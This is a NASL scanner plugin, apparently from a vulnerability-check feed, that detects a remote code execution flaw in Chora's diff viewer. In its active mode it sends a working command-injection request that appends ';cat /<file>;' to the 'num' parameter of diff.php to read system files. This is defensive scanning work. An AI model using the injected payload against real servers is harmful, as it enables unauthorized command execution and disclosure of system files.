CPE = "cpe:/a:horde:chora";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.12281" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_bugtraq_id( 10531 );
	script_xref( name: "GLSA", value: "GLSA 200406-09" );
	script_xref( name: "OSVDB", value: "7005" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_name( "Chora Remote Code Execution Vulnerability" );
	script_category( ACT_MIXED_ATTACK );
	script_tag( name: "qod_type", value: "remote_active" );
	script_copyright( "Copyright (C) 2004 George A. Theall" );
	script_family( "Web application abuses" );
	script_dependencies( "chora_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "chora/detected" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Upgrade to Chora version 1.2.2 or later." );
	script_tag( name: "summary", value: "The remote server is running at least one instance of Chora version
  1.2.1 or earlier. Such versions have a flaw in the diff viewer that enables a remote attacker to run
  arbitrary code with the permissions of the web user." );
	script_xref( name: "URL", value: "http://security.e-matters.de/advisories/102004.html" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("version_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!infos = get_app_version_and_location( cpe: CPE, port: port, exit_no_version: FALSE )){
	exit( 0 );
}
ver = infos["version"];
dir = infos["location"];
func find_cvsfile( basedir, cvsdir ){
	var url, req, res, pat, matches, m, files, dirs;
	url = NASLString( basedir, "/cvs.php", cvsdir );
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(res == NULL){
		return "";
	}
	if(egrep( string: res, pattern: "^HTTP/1\\.[01] 200" )){
		pat = "/co\\.php/.*(/.+)\\?r=";
		matches = egrep( string: res, pattern: pat );
		if(!isnull( matches )){
			for m in split( matches ) {
				files = eregmatch( string: m, pattern: pat );
				if(!isnull( files )){
					return ( NASLString( cvsdir, files[1] ) );
				}
			}
		}
		pat = "folder\\.gif[^>]+>&nbsp;([^<]+)/</a>";
		matches = egrep( string: res, pattern: pat );
		if(!isnull( matches )){
			for m in split( matches ) {
				dirs = eregmatch( string: m, pattern: pat );
				if(!isnull( dirs )){
					file = find_cvsfile( basedir: basedir, cvsdir: NASLString( cvsdir, "/", dirs[1] ) );
					if(!isnull( file )){
						return ( file );
					}
				}
			}
		}
	}
}
if( safe_checks() ){
	if(ver && ereg( pattern: "^(0\\.|1\\.(0\\.|1\\.|2|2\\.1))(-(cvs|ALPHA))$", string: ver )){
		report = report_fixed_ver( installed_version: ver, fixed_version: "1.2.2", install_url: dir );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
else {
	files = traversal_files();
	file = find_cvsfile( basedir: dir, cvsdir: "" );
	if(!isnull( file )){
		for pattern in keys( files ) {
			file = files[pattern];
			rev = "1.1";
			url = NASLString( dir, "/diff.php", file, "?r1=", rev, "&r2=", rev, "&ty=c", "&num=3;cat%20/" + file + ";" );
			req = http_get( item: url, port: port );
			res = http_keepalive_send_recv( port: port, data: req );
			if(!res){
				continue;
			}
			if(egrep( string: res, pattern: pattern )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

